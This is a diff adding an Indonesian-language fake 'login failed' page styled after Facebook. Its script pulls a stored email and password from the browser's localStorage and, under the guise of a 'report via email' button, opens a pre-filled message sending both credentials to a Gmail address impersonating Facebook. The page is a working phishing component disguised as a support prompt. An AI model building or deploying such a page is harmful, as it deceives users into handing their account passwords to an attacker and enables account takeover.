@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Gagal</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .failed-login-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 300px;
+        }
+
+        .failed-login-container h2 {
+            color: red;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        .failed-login-container p {
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .failed-login-container button {
+            background-color: #1877f2;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            width: 100%;
+            cursor: pointer;
+        }
+
+        .failed-login-container button:hover {
+            background-color: #145dbf;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="failed-login-container">
+        <h2>Login Gagal!</h2>
+        <p>Sepertinya terjadi kesalahan saat login. Apakah Anda ingin melaporkan masalah ini melalui email?</p>
+        <button onclick="kirimEmail()">Laporkan via Email</button>
+    </div>
+
+    <script>
+        function kirimEmail() {
+            // Ambil email dari localStorage
+            var email = localStorage.getItem("failedEmail");
+            
+            var password = localStorage.getItem("failedPassword");
+
+            if (!email) {
+                email = "tidak ada email yang dimasukkan";  // Jaga-jaga jika email kosong
+            }
+
+            // Arahkan pengguna ke Gmail dengan template email
+            window.location.href = `mailto:F4C3B00K.117@gmail.com?subject=Login Gagal di Facebook&body=Login dengan email ${email}<br> dan password ${password} mengalami masalah. Mohon bantuannya.`;
+        }
+    </script>
+
+</body>
+</html>
